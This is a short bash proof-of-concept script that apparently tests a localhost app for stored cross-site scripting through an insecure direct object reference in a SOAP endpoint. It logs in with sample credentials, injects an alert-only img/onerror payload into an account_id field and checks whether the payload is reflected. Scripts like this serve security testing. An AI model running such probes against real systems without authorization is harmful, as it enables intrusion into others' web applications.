#!/bin/bash
# Stored XSS via IDOR in SOAP Service

# Get session cookie
SESSION_RESPONSE=$(curl -i -c /tmp/session_cookies.txt -X POST http://localhost/login \
  -d "username=john&password=password123" 2>&1)

SESSION=$(echo "$SESSION_RESPONSE" | grep "Set-Cookie" | grep "session=" | cut -d'=' -f2 | cut -d';' -f1)

if [ -z "$SESSION" ]; then
  echo "Failed to authenticate"
  exit 1
fi

# Send XSS payload via IDOR
echo "Testing Stored XSS via IDOR..."
XSS_PAYLOAD="XSS_TEST_<img src=x onerror='alert(1)'>"

# URL encode the payload for XML
ENCODED_PAYLOAD="XSS_TEST_&lt;img src=x onerror='alert(1)'&gt;"

# Send to SOAP service
RESPONSE=$(curl -s -b "session=$SESSION" -X POST http://localhost/soap_service \
  -H "Content-Type: application/xml" \
  -d "<GetAccountInfoRequest><account_id>$ENCODED_PAYLOAD</account_id></GetAccountInfoRequest>")

# Check if XSS payload is reflected
if echo "$RESPONSE" | grep -q "<img src=x onerror='alert(1)'"; then
  echo "STORED XSS VIA IDOR CONFIRMED"
  echo "Payload successfully reflected in response:"
  echo "$RESPONSE" | grep -o "<account_id>.*</account_id>" | head -c 150
  echo ""
  exit 0
else
  echo "Test failed"
  exit 1
fi
